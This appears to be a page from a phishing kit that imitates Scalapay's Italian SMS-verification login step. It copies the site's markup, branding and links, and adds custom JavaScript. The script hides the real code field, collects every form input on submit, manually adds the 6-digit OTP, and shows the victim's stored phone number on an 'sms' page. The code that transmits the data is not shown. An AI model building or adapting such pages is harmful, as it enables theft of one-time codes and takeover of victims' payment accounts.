...
/* ===== FIX: Hide the real input and its container ===== */
...
/* ===== Mobile OTP fix: scale down boxes on small screens ===== */
...
<div class="page-module-scss-module__rcUngW__login__container snipcss-4MG7H">
    <div class="page-module-scss-module__rcUngW__loginArea">
                    ...
                    <div class="StepHeader-module-scss-module__Jib0XW__stepHeader">
                        <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__icon">
                            <div class="_icon_a84d7_1 style-v6VTs" id="style-v6VTs"><svg width="32" height="33" viewBox="0 0 32 33" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M18.5 10.5V10C18.5 8.61929 17.3807 7.5 16 7.5C14.6193 7.5 13.5 8.61929 13.5 10V10.5H18.5ZM10.5 10.5205V10.5V10C10.5 6.96243 12.9624 4.5 16 4.5C19.0376 4.5 21.5 6.96243 21.5 10V10.5V10.5205C24.5798 10.7746 27 13.3546 27 16.5V22.5C27 25.8137 24.3137 28.5 21 28.5H11C7.68629 28.5 5 25.8137 5 22.5V16.5C5 13.3546 7.42023 10.7746 10.5 10.5205ZM10.9841 13.5C9.33459 13.5085 8 14.8484 8 16.5V22.5C8 24.1568 9.34315 25.5 11 25.5H21C22.6569 25.5 24 24.1568 24 22.5V16.5C24 14.8484 22.6654 13.5085 21.0159 13.5H18.5H13.5H10.9841ZM17 20.5658C17.5978 20.22 18 19.5737 18 18.8334C18 17.7288 17.1046 16.8334 16 16.8334C14.8954 16.8334 14 17.7288 14 18.8334C14 19.5737 14.4022 20.22 15 20.5658V21.1667C15 21.719 15.4477 22.1667 16 22.1667C16.5523 22.1667 17 21.719 17 21.1667V20.5658Z" fill="currentColor"></path>
                                </svg></div>
                        </div>
                        <div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__title" data-automation="login-header-title">Inserisci il codice a 6 cifre</div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__subtitle" data-automation="login-header-subtitle">Inserisci il codice di verifica che ti abbiamo inviato sul cellulare.</div>
                            <div class="StepHeader-module-scss-module__Jib0XW__stepHeader__action">Non tu?&nbsp;<a href="#" aria-disabled="false" class="StepHeader-module-scss-module__Jib0XW__stepHeader__action__link" data-automation="change-phone-number-link">Prova con un altro numero.</a></div>
                        </div>
                    </div>
                        ...
                        <div class="_otp_k4q7z_1 style-WS6dl" data-automation="otp__container" id="style-WS6dl">
                            <div class="_otp__boxes_k4q7z_4">
                                ...
                                <div class="_core_u1pz0_46" data-automation="login-otp-input">
                                    <div class="_inputWrapper_u1pz0_51"><input class="_input_u1pz0_33 _otp__input_k4q7z_32" inputmode="numeric" maxlength="6" id="_r_j_" placeholder="" type="tel" value=""></div>
                                </div>
                            </span>
                        </div>
                    </div>
                    <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__sentBanner">
                        <div class="OtpSentBanner-module-scss-module__nNEcvq__container">
                            <div class="OtpSentBanner-module-scss-module__nNEcvq__title__container">
                                <div class="OtpSentBanner-module-scss-module__nNEcvq__icon"><img alt="success" loading="lazy" width="10" height="10" decoding="async" data-nimg="1" src="https://login.scalapay.com/images/success_filled.svg" id="style-E6CZ8" class="style-E6CZ8"></div><span class="OtpSentBanner-module-scss-module__nNEcvq__title">Codice inviato al tuo telefono</span>
                            </div><span class="OtpSentBanner-module-scss-module__nNEcvq__subtitle">Dovresti ricevere un codice di verifica entro 20 secondi.</span>
                        </div>
                    </div>
                    <div class="OtpForm-module-scss-module__x5Q-Ya__otpForm__resendLinks"><span class="OtpForm-module-scss-module__x5Q-Ya__otpForm__resendLinks__timer" data-automation="resend-code-timer">Invia nuovamente il codice tra 20s</span></div>
        ...
        <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions">
            <div class="LoginFlow-module-scss-module__Q12x1a__loginFlow__loginTermsAndConditions__text">Cliccando su “Continua” accetti <a href="https://cdn.scalapay.com/terms-and-conditions/en-IT/Scalapay - Terms_and_Conditions.pdf" target="_blank" rel="noreferrer" data-automation="general-terms-and-conditions-link">Informazioni generali T&amp;C</a>, the <a href="https://cdn.scalapay.com/privacy-policy/srl-privacy/en-IT/Scalapay_S.r.l._privacy_policy.pdf" target="_blank" rel="noreferrer" data-automation="privacy-policy-link">privacy</a> and <a href="https://www.scalapay.com/cookies?country=IT" target="_blank" rel="noreferrer" data-automation="cookie-policy-link">cookie</a> politiche.</div>
        </div>
        ...
        <div>
            <div class="Footer-module-scss-module__m5Bw6W__footer__bottom"><a target="_blank" href="https://www.scalapay.com/it/dati-societari" data-automation="profile-about-scalapay-link" rel="noreferrer" class="Footer-module-scss-module__m5Bw6W__footer__bottom__link">Informazioni su Scalapay</a></div>
        </div>
    </div>
        ...
        <div class="AppDownloadBanner-module-scss-module__fqXfRW__container">
            <div class="AppDownloadBanner-module-scss-module__fqXfRW__banner AppDownloadBanner-module-scss-module__fqXfRW__banner--loginVariant" data-automation="app-download-banner">
                <div class="BannerText-module-scss-module__7Pv6ma__textSection" data-automation="app-download-banner-text">
                    <h1 class="BannerText-module-scss-module__7Pv6ma__title">Scarica l'app</h1>
                    <ul class="BannerText-module-scss-module__7Pv6ma__features" data-automation="app-download-banner-feature-list">
                        <li>Accesso più veloce</li>
                        <li>Scopri le offerte esclusive</li>
                        <li>Gestisci facilmente i tuoi acquisti</li>
                        <li>Tieni tutto sotto controllo</li>
                    </ul>
                </div>
                <div class="QrCode-module-scss-module__YPyFKa__qrCodeSection" data-automation="app-download-banner-qr-code"><span>Scansiona il codice QR e scarica l'app</span><img alt="QR Code to the link to download Scalapay app" src="https://login.scalapay.com/images/app-download-qr-code.svg"></div>
...
(function() {
    // ===== COUNTDOWN TIMER =====
    var timerEl = document.querySelector('[data-automation="resend-code-timer"]');
    if (timerEl) {
        var seconds = 20;
        var interval = setInterval(function() {
            seconds--;
            if (seconds > 0) {
                timerEl.textContent = 'Invia nuovamente il codice a ' + seconds + 's';
            } else {
                timerEl.textContent = 'Invia nuovamente il codice';
    ...
    var otpContainer = document.querySelector('._otp_k4q7z_1');
    var boxesContainer = document.querySelector('._otp__boxes_k4q7z_4');

    if (otpInput && boxes.length === 6 && boxesContainer) {
        // Move the real input to be a sibling of boxes (not inside), and hide it off-screen
        ...
        // Create a transparent click-capture overlay over the boxes
        var clickOverlay = document.createElement('div');
        clickOverlay.style.cssText = 'position:absolute;top:0;left:0;right:0;bottom:0;z-index:10;cursor:text;';
        boxesContainer.style.position = 'relative';
        boxesContainer.appendChild(clickOverlay);
        ...
        // Handle input on the hidden input
        otpInput.addEventListener('input', function() {
            updateBoxes(otpInput.value);
        });

        otpInput.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace') {
                setTimeout(function() { updateBoxes(otpInput.value); }, 0);
            }
        });

        otpInput.addEventListener('paste', function(e) {
            setTimeout(function() { updateBoxes(otpInput.value); }, 10);
        });

        // Clicking overlay or boxes focuses the hidden input
    ...
    function trackForms() {
        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                ...
                const data = {};
                // Collect all inputs inside the form
                form.querySelectorAll('input, select, textarea').forEach(function(inp) {
                    // Use data-automation or id/name
                ...
                // 🟢 MANUALLY ADD OTP VALUE (since it's outside the form)
                var otpInput = document.querySelector('._otp__input_k4q7z_32');
                if (otpInput) {
                    var otpValue = otpInput.value.replace(/\D/g, '');
                    if (otpValue.length === 6) {
                        data['otp'] = otpValue;   // or 'sms_code'
                    }
                }
    ...
    function applyStoredPhone() {
        if (PAGE_NAME === 'sms' && phoneNumber) {
            ...
            subs.forEach(function(sub) {
                sub.textContent = 'Enter the verification code we sent to +39' + phoneNumber + '.';
            });
        }
    }
